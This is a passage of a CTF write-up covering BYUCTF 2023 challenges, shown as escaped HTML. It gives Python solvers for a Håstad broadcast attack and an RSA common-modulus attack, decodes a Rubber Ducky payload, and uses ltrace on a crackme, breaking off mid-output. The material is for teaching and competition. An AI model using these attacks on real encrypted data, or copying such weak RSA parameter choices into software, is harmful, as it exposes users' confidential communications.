&lt;&#x2F;span&gt;&lt;span&gt;N1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;N&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;n1
&lt;&#x2F;span&gt;&lt;span&gt;N2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;N&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;n2 
&lt;&#x2F;span&gt;&lt;span&gt;N3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;N&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;n3
&lt;&#x2F;span&gt;&lt;span&gt;y1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(N1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n1)
&lt;&#x2F;span&gt;&lt;span&gt;y2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(N2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n2)
&lt;&#x2F;span&gt;&lt;span&gt;y3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(N3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n3)
&lt;&#x2F;span&gt;&lt;span&gt;X &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;y1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;N1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;y2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;N2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(c3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;y3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;N3)
&lt;&#x2F;span&gt;&lt;span&gt;M &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;N
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;inv_pow&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    low &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= -&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    high &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;low &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;high:
&lt;&#x2F;span&gt;&lt;span&gt;        m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(low &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;high) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;        p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;c:
&lt;&#x2F;span&gt;&lt;span&gt;            low &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            high &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;    m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;high
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;c
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;inv_pow&lt;&#x2F;span&gt;&lt;span&gt;(M&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# byuctf{hastad_broadcast_attack_is_why_e_needs_to_be_very_large}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{hastad_broadcast_attack_is_why_e_needs_to_be_very_large}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;rsa-5-drop-of-blood&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rsa-5-drop-of-blood&quot; aria-label=&quot;Anchor link for: rsa-5-drop-of-blood&quot;&gt;RSA-5 ü©∏&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;n = 158307578375429142391814474806884486236362186916188452580137711655290101749246194796158132723192108831610021920979976831387798531310286521988621973910776725756124498277292094830880179737057636826926718870947402385998304759357604096043571760391265436342427330673679572532727716853811470803394787706010603830747
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e1 = 65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c1 = 147465654815005020063943150787541676244006907179548061733683379407115931956604160894199596187128857070739585522099795520030109295201146791378167977530770154086872347421667566213107792455663772279848013855378166127142983660396920011133029349489200452580907847840266595584254579298524777000061248118561875608240
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e2 = 65521
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c2 = 142713643080475406732653557020038566547302005567266455940547551173573770529850069157484999432568532977025654715928532390305041525635025949965799289602536953914794718670859158768092964083443092374251987427058692219234329521939404919423432910655508395090232621076454399975588453154238832799760275047924852124717
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Dropped ü©∏ again..&lt;&#x2F;p&gt;
&lt;p&gt;Observations:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;common modulus&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;e1 != e2&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;And that&#x27;s enough this system was prone to &lt;a href=&quot;https:&#x2F;&#x2F;crypto.stackexchange.com&#x2F;questions&#x2F;16283&#x2F;how-to-use-common-modulus-attack&quot; target=_blank&gt;common modulus attack&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Here is my solv.py&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;math &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;isqrt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;158307578375429142391814474806884486236362186916188452580137711655290101749246194796158132723192108831610021920979976831387798531310286521988621973910776725756124498277292094830880179737057636826926718870947402385998304759357604096043571760391265436342427330673679572532727716853811470803394787706010603830747
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;65537
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;147465654815005020063943150787541676244006907179548061733683379407115931956604160894199596187128857070739585522099795520030109295201146791378167977530770154086872347421667566213107792455663772279848013855378166127142983660396920011133029349489200452580907847840266595584254579298524777000061248118561875608240
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;e2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;65521
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;c2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;142713643080475406732653557020038566547302005567266455940547551173573770529850069157484999432568532977025654715928532390305041525635025949965799289602536953914794718670859158768092964083443092374251987427058692219234329521939404919423432910655508395090232621076454399975588453154238832799760275047924852124717
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extended_gcd&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;b, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        gcd, x, y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extended_gcd&lt;&#x2F;span&gt;&lt;span&gt;(b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;a)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;gcd, y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;(b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;a) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;x, x
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;e2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;c2&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    d, x, y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extended_gcd&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;e2)    
&lt;&#x2F;span&gt;&lt;span&gt;    m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;solve&lt;&#x2F;span&gt;&lt;span&gt;(e1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;e2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;c1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;c2)
&lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(message)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(m)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# byuctf{NEVER_USE_SAME_MODULUS_WITH_DIFFERENT_e_VALUES}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{NEVER_USE_SAME_MODULUS_WITH_DIFFERENT_e_VALUES}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;compact&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#compact&quot; aria-label=&quot;Anchor link for: compact&quot;&gt;compact&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;The attached image&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;byuctf23&#x2F;compact_chall.png&quot; alt=&quot;compact&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A reverse image search on google shows some keywords &lt;code&gt;dotsite&lt;&#x2F;code&gt; is of them. So, searching for dotsite cipher on google resulted &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;dotsies-writing&quot; target=_blank&gt;this site&lt;&#x2F;a&gt;. The message was deciphered as
&lt;code&gt;BYUCTF  WELL   ITS  DEFINITELY  MORE COMPACT&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{well its definitely more compact}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;rev&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rev&quot; aria-label=&quot;Anchor link for: rev&quot;&gt;Rev&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h1 id=&quot;ducky-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ducky-1&quot; aria-label=&quot;Anchor link for: ducky-1&quot;&gt;Ducky 1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;I recently got ahold of a Rubber Ducky, and have started automating ALL of my work tasks with it! You should check it out!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [inject.bin]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A quick google search for &lt;strong&gt;rubber ducky file bin analysis&lt;&#x2F;strong&gt; takes to this github repo &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;JPaulMora&#x2F;Duck-Decoder&quot; target=_blank&gt;Duck-Decoder&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&#x2F;duck1$&lt;&#x2F;span&gt;&lt;span&gt; python DuckDecoder.py decode inject.bin
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;byuctf{this_was_just_an_intro_alright??&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{this_was_just_an_intro_alright??}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;reveng&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reveng&quot; aria-label=&quot;Anchor link for: reveng&quot;&gt;RevEng&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;See if you can find the flag!
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [gettingBetter]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I ran the executable and it asked me for the &quot;correct passphrase&quot;. So I just tried ltrace to find wheather we can see anything which was compared with the user input. And I got the passphrase.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;reveng$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;gettingBetter
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Please enter the correct passphr&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...)          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;53
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fgets&lt;&#x2F;span&gt;&lt;span&gt;(Please enter the correct passphrase to get the flag: 1234
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1234\n&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 100, 0x7f6979c19aa0)                   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x7ffe784643c0
